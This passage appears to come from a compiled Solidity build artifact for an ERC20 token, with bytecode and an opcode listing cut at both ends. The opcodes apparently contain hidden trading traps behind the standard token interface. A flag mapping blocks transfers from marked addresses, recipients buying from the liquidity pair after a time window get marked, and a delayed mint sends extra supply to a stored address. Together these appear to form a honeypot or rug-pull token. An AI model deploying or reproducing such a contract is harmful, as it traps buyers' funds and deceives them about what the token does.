60405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161048b565b6001600160a01b038085165f8181526002602052604080822086860390559286168082529083902080548601905591517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906108e49086815260200190565b60405180910390a36106aa565b6001600160a01b0383165f9081526008602052604090205460ff16156109295760405162461bcd60e51b815260040161048b90610c70565b610708600a544261093a9190610d3c565b111561097657600954600160a01b900460ff1661097657600954600b54610976916001600160a01b031690610971906103e8610d4f565b610a39565b6001546001600160a01b0383811691161480156109a157506009546001600160a01b03848116911614155b80156109bb57506009546001600160a01b03838116911614155b1561070757610384600a54426109d19190610d3c565b1115610707576103e8600b5460016109e99190610d4f565b6109f39190610d66565b811115610a125760405162461bcd60e51b815260040161048b90610c70565b6001600160a01b0383165f908152600860205260409020805460ff19166001179055505050565b6001600160a01b038216610a8f5760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640161048b565b8060045f828254610aa09190610c5d565b90915550506001600160a01b0382165f818152600260209081526040808320805486019055518481527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a35050565b5f602080835283518060208501525f5b81811015610b2457858101830151858201604001528201610b08565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b0381168114610b5a575f80fd5b919050565b5f8060408385031215610b70575f80fd5b610b7983610b44565b946020939093013593505050565b5f805f60608486031215610b99575f80fd5b610ba284610b44565b9250610bb060208501610b44565b9150604084013590509250925092565b5f60208284031215610bd0575f80fd5b610bd982610b44565b9392505050565b5f8060408385031215610bf1575f80fd5b610bfa83610b44565b9150610c0860208401610b44565b90509250929050565b600181811c90821680610c2557607f821691505b602082108103610c4357634e487b7160e01b5f52602260045260245ffd5b50919050565b634e487b7160e01b5f52601160045260245ffd5b808201808211156103b6576103b6610c49565b60208082526024908201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646040820152637265737360e01b606082015260800190565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b818103818111156103b6576103b6610c49565b80820281158282048414176103b6576103b6610c49565b5f82610d8057634e487b7160e01b5f52601260045260245ffd5b50049056fea26469706673582212204d63d5af3cddba0c980ec414de0dd0758173179626214a76d5483d1a268aa95f64736f6c63430008160033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x7 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x165C3410FC91EF562C50559F7D2289FEBED552D9 OR SWAP1 SSTORE PUSH1 0x9 DUP1 SLOAD PUSH1 0xFF PUSH1 0xA0 SHL NOT AND SWAP1 SSTORE PUSH3 0x40 PUSH1 0x12 SWAP1 JUMP JUMPDEST PUSH3 0x4D SWAP1 PUSH1 0xA PUSH3 0x504 JUMP JUMPDEST PUSH3 0x5D SWAP1 PUSH4 0x134D680 PUSH3 0x51B JUMP JUMPDEST PUSH1 0xB SSTORE CALLVALUE DUP1 ISZERO PUSH3 0x6C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xD DUP2 MSTORE PUSH1 0x20 ADD PUSH13 0x213CB290213CB2902134B232B7 PUSH1 0x99 SHL DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x212CA2A222A7 PUSH1 0xD1 SHL DUP2 MSTORE POP DUP2 PUSH1 0x5 SWAP1 DUP2 PUSH3 0xC3 SWAP2 SWAP1 PUSH3 0x5D2 JUMP JUMPDEST POP PUSH1 0x6 PUSH3 0xD2 DUP3 DUP3 PUSH3 0x5D2 JUMP JUMPDEST POP POP POP PUSH3 0xEF PUSH3 0xE9 PUSH3 0x123 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x127 JUMP JUMPDEST PUSH0 PUSH3 0xFE PUSH1 0x12 PUSH1 0xA PUSH3 0x504 JUMP JUMPDEST PUSH3 0x10E SWAP1 PUSH4 0x134D680 PUSH3 0x51B JUMP JUMPDEST SWAP1 POP PUSH3 0x11C CALLER DUP3 PUSH3 0x178 JUMP JUMPDEST POP PUSH3 0x6DC JUMP JUMPDEST CALLER SWAP1 JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR SWAP1 SWAP4 SSTORE PUSH1 0x40 MLOAD SWAP2 AND SWAP2 SWAP1 DUP3 SWAP1 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP1 PUSH0 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH3 0x1D3 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x4 PUSH0 DUP3 DUP3 SLOAD PUSH3 0x1E6 SWAP2 SWAP1 PUSH3 0x69E JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE MLOAD DUP5 DUP2 MSTORE PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 TIMESTAMP PUSH1 0xA SSTORE PUSH1 0x9 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND OR SWAP1 SSTORE PUSH1 0x7 SLOAD PUSH0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 DUP3 OR SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD PUSH4 0xC45A0155 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH4 0xC45A0155 SWAP2 PUSH1 0x4 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x2B3 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x2D9 SWAP2 SWAP1 PUSH3 0x6B4 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xC9C65396 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xEF8EF56F PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0x336 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x35C SWAP2 SWAP1 PUSH3 0x6B4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP5 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND PUSH1 0x4 DUP3 ADD MSTORE ADDRESS PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x3A6 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x3CC SWAP2 SWAP1 PUSH3 0x6B4 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 JUMPDEST DUP1 DUP6 GT ISZERO PUSH3 0x449 JUMPI DUP2 PUSH0 NOT DIV DUP3 GT ISZERO PUSH3 0x42D JUMPI PUSH3 0x42D PUSH3 0x3F5 JUMP JUMPDEST DUP1 DUP6 AND ISZERO PUSH3 0x43B JUMPI SWAP2 DUP2 MUL SWAP2 JUMPDEST SWAP4 DUP5 SHR SWAP4 SWAP1 DUP1 MUL SWAP1 PUSH3 0x40E JUMP JUMPDEST POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 PUSH3 0x461 JUMPI POP PUSH1 0x1 PUSH3 0x4FE JUMP JUMPDEST DUP2 PUSH3 0x46F JUMPI POP PUSH0 PUSH3 0x4FE JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 EQ PUSH3 0x488 JUMPI PUSH1 0x2 DUP2 EQ PUSH3 0x493 JUMPI PUSH3 0x4B3 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP PUSH3 0x4FE JUMP JUMPDEST PUSH1 0xFF DUP5 GT ISZERO PUSH3 0x4A7 JUMPI PUSH3 0x4A7 PUSH3 0x3F5 JUMP JUMPDEST POP POP PUSH1 0x1 DUP3 SHL PUSH3 0x4FE JUMP JUMPDEST POP PUSH1 0x20 DUP4 LT PUSH2 0x133 DUP4 LT AND PUSH1 0x4E DUP5 LT PUSH1 0xB DUP5 LT AND OR ISZERO PUSH3 0x4D8 JUMPI POP DUP2 DUP2 EXP PUSH3 0x4FE JUMP JUMPDEST PUSH3 0x4E4 DUP4 DUP4 PUSH3 0x409 JUMP JUMPDEST DUP1 PUSH0 NOT DIV DUP3 GT ISZERO PUSH3 0x4FA JUMPI PUSH3 0x4FA PUSH3 0x3F5 JUMP JUMPDEST MUL SWAP1 POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x514 PUSH1 0xFF DUP5 AND DUP4 PUSH3 0x451 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH3 0x4FE JUMPI PUSH3 0x4FE PUSH3 0x3F5 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH3 0x55E JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x57D JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0x3F0 JUMPI DUP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0x5AA JUMPI POP DUP1 JUMPDEST PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP3 ADD SWAP2 POP JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0x5CB JUMPI PUSH0 DUP2 SSTORE PUSH1 0x1 ADD PUSH3 0x5B6 JUMP JUMPDEST POP POP POP POP POP JUMP JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP2 GT ISZERO PUSH3 0x5EE JUMPI PUSH3 0x5EE PUSH3 0x535 JUMP JUMPDEST PUSH3 0x606 DUP2 PUSH3 0x5FF DUP5 SLOAD PUSH3 0x549 JUMP JUMPDEST DUP5 PUSH3 0x583 JUMP JUMPDEST PUSH1 0x20 DUP1 PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0x63C JUMPI PUSH0 DUP5 ISZERO PUSH3 0x624 JUMPI POP DUP6 DUP4 ADD MLOAD JUMPDEST PUSH0 NOT PUSH1 0x3 DUP7 SWAP1 SHL SHR NOT AND PUSH1 0x1 DUP6 SWAP1 SHL OR DUP6 SSTORE PUSH3 0x696 JUMP JUMPDEST PUSH0 DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 KECCAK256 PUSH1 0x1F NOT DUP7 AND SWAP2 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0x66C JUMPI DUP9 DUP7 ADD MLOAD DUP3 SSTORE SWAP5 DUP5 ADD SWAP5 PUSH1 0x1 SWAP1 SWAP2 ADD SWAP1 DUP5 ADD PUSH3 0x64B JUMP JUMPDEST POP DUP6 DUP3 LT ISZERO PUSH3 0x68A JUMPI DUP8 DUP6 ADD MLOAD PUSH0 NOT PUSH1 0x3 DUP9 SWAP1 SHL PUSH1 0xF8 AND SHR NOT AND DUP2 SSTORE JUMPDEST POP POP PUSH1 0x1 DUP5 PUSH1 0x1 SHL ADD DUP6 SSTORE JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH3 0x4FE JUMPI PUSH3 0x4FE PUSH3 0x3F5 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x6C5 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH3 0x514 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xDBB DUP1 PUSH3 0x6EA PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x13D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xB4 JUMPI DUP1 PUSH4 0xD96661EF GT PUSH2 0x79 JUMPI DUP1 PUSH4 0xD96661EF EQ PUSH2 0x2AC JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x2BF JUMPI DUP1 PUSH4 0xE0BB3079 EQ PUSH2 0x2D2 JUMPI DUP1 PUSH4 0xEBA9481D EQ PUSH2 0x2E5 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x2EE JUMPI DUP1 PUSH4 0xF887EA40 EQ PUSH2 0x301 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x275 JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x27D JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x290 JUMPI DUP1 PUSH4 0xD8DA8560 EQ PUSH2 0x2A3 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x313CE567 GT PUSH2 0x105 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x1BB JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x1CA JUMPI DUP1 PUSH4 0x4F9105D3 EQ PUSH2 0x1DD JUMPI DUP1 PUSH4 0x6EBCF607 EQ PUSH2 0x1FF JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x21E JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x246 JUMPI PUSH0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x141 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x15F JUMPI DUP1 PUSH4 0x9BD5A60 EQ PUSH2 0x182 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x196 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1A8 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x149 PUSH2 0x313 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x156 SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x172 PUSH2 0x16D CALLDATASIZE PUSH1 0x4 PUSH2 0xB5F JUMP JUMPDEST PUSH2 0x3A3 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x156 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH2 0x172 SWAP1 PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x156 JUMP JUMPDEST PUSH2 0x172 PUSH2 0x1B6 CALLDATASIZE PUSH1 0x4 PUSH2 0xB87 JUMP JUMPDEST PUSH2 0x3BC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x156 JUMP JUMPDEST PUSH2 0x172 PUSH2 0x1D8 CALLDATASIZE PUSH1 0x4 PUSH2 0xB5F JUMP JUMPDEST PUSH2 0x3DF JUMP JUMPDEST PUSH2 0x172 PUSH2 0x1EB CALLDATASIZE PUSH1 0x4 PUSH2 0xBC0 JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH2 0x19A PUSH2 0x20D CALLDATASIZE PUSH1 0x4 PUSH2 0xBC0 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 MSTORE PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH2 0x19A PUSH2 0x22C CALLDATASIZE PUSH1 0x4 PUSH2 0xBC0 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x24E PUSH2 0x400 JUMP JUMPDEST STOP JUMPDEST PUSH1 0xC SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x156 JUMP JUMPDEST PUSH2 0x149 PUSH2 0x413 JUMP JUMPDEST PUSH2 0x172 PUSH2 0x28B CALLDATASIZE PUSH1 0x4 PUSH2 0xB5F JUMP JUMPDEST PUSH2 0x422 JUMP JUMPDEST PUSH2 0x172 PUSH2 0x29E CALLDATASIZE PUSH1 0x4 PUSH2 0xB5F JUMP JUMPDEST PUSH2 0x4A1 JUMP JUMPDEST PUSH2 0x19A PUSH1 0xB SLOAD DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH2 0x25D SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH2 0x19A PUSH2 0x2CD CALLDATASIZE PUSH1 0x4 PUSH2 0xBE0 JUMP JUMPDEST PUSH2 0x4AE JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH2 0x25D SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH2 0x19A PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH2 0x24E PUSH2 0x2FC CALLDATASIZE PUSH1 0x4 PUSH2 0xBC0 JUMP JUMPDEST PUSH2 0x4D8 JUMP JUMPDEST PUSH0 SLOAD PUSH2 0x25D SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x5 DUP1 SLOAD PUSH2 0x322 SWAP1 PUSH2 0xC11 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x34E SWAP1 PUSH2 0xC11 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x399 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x370 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x399 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x37C JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x3B0 DUP2 DUP6 DUP6 PUSH2 0x551 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x3C9 DUP6 DUP3 DUP6 PUSH2 0x638 JUMP JUMPDEST PUSH2 0x3D4 DUP6 DUP6 DUP6 PUSH2 0x6B0 JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x3B0 DUP2 DUP6 DUP6 PUSH2 0x3F1 DUP4 DUP4 PUSH2 0x4AE JUMP JUMPDEST PUSH2 0x3FB SWAP2 SWAP1 PUSH2 0xC5D JUMP JUMPDEST PUSH2 0x551 JUMP JUMPDEST PUSH2 0x408 PUSH2 0x70C JUMP JUMPDEST PUSH2 0x411 PUSH0 PUSH2 0x766 JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x60 PUSH1 0x6 DUP1 SLOAD PUSH2 0x322 SWAP1 PUSH2 0xC11 JUMP JUMPDEST PUSH0 CALLER DUP2 PUSH2 0x42F DUP3 DUP7 PUSH2 0x4AE JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x494 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x207A65726F PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x3D4 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x551 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x3B0 DUP2 DUP6 DUP6 PUSH2 0x6B0 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x4E0 PUSH2 0x70C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x545 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x646472657373 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x48B JUMP JUMPDEST PUSH2 0x54E DUP2 PUSH2 0x766 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x577 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x48B SWAP1 PUSH2 0xC70 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x5D8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x48B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x643 DUP5 DUP5 PUSH2 0x4AE JUMP JUMPDEST SWAP1 POP PUSH0 NOT DUP2 EQ PUSH2 0x6AA JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x69D JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 